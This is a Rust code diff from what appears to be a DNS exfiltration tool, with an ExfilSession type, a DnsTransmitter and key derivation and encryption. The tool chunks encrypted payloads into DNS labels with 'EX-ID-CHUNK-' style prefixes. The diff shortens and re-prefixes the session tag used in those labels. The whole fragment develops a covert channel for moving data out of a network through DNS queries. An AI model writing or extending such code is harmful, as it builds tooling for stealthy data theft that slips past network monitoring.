@@ -1,4 +1,3 @@
-
 use crate::base36;
 use crate::config::Config;
 use crate::crypto::{derive_key, encrypt};
@@ -15,7 +14,8 @@ use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};
 
 const LABEL_CAP: usize = 62;
 const MAX_LABELS: usize = 2;
-const SESSION_TAG_LEN: usize = 6;
+const SESSION_TAG_LEN: usize = 3;
+const SESSION_TAG_PREFIX: char = 'E';
 const COUNTER_WIDTH: usize = 5;
 const CHUNK_PREFIX_LEN: usize = 2 + 1 + SESSION_TAG_LEN + 1 + COUNTER_WIDTH + 1; // EX-ID-CHUNK-
 const LABEL_DELIM: char = '-';
@@ -162,8 +162,7 @@ impl DnsTransmitter {
         let bytes = frame.as_bytes();
         while idx < bytes.len() {
             let end = (idx + LABEL_CAP).min(bytes.len());
-            let label = std::str::from_utf8(&bytes[idx..end])?
-                .to_string();
+            let label = std::str::from_utf8(&bytes[idx..end])?.to_string();
             labels.push(label);
             idx = end;
             if labels.len() > MAX_LABELS {
@@ -308,14 +307,19 @@ fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
 }
 
 fn encode_session_tag(session_id: u32) -> String {
-    let max = max_value_for_width(SESSION_TAG_LEN);
+    let digits = SESSION_TAG_LEN.saturating_sub(1);
+    if digits == 0 {
+        return SESSION_TAG_PREFIX.to_string();
+    }
+    let max = max_value_for_width(digits);
     let modulus = max.saturating_add(1);
     let normalized = if modulus == 0 {
         session_id
     } else {
         session_id % modulus
     };
-    encode_base36_fixed(normalized, SESSION_TAG_LEN).expect("fixed width encoding")
+    let suffix = encode_base36_fixed(normalized, digits).expect("fixed width encoding");
+    format!("{}{}", SESSION_TAG_PREFIX, suffix)
 }
 
 fn encode_counter(value: u32, width: usize) -> Result<String> {
